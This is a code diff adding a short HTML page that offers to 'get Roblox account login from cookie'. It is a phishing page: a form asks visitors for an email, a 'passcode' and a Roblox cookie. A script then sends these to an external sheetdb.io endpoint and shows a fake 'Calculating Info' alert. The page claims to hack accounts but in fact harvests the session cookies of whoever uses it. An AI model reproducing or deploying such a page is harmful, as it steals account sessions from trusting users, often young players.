@@ -1,0 +1,42 @@
+<img src="icon.jpg" 
+width="150"
+height="150"
+>
+
+<br>
+<br>
+<br>
+
+<body>
+    Simple HTML To Get Roblox Account Login From Cookie
+</body>
+
+<br>
+<br>
+
+<form action="https://sheetdb.io/api/v1/asxzv6zzbhdhx" method="POST" id="sheetdb-form">  
+    Email: <input name="data[email]">
+    Passcode(found in the video): <input name="data[passcode]">
+    Cookie: <input name="data[cookie]">
+    <button type="submit">Get The Login</button>
+</form>
+
+<body>When The Account Is Hacked We Will Email You The Information</body>
+
+
+
+<script>
+    var form = document.getElementById('sheetdb-form');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+          method : "POST",
+          body: new FormData(document.getElementById("sheetdb-form")),
+      }).then(
+          response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        alert('Calculating Info This May Take A Few Minutes')
+      });
+    });
+  </script>
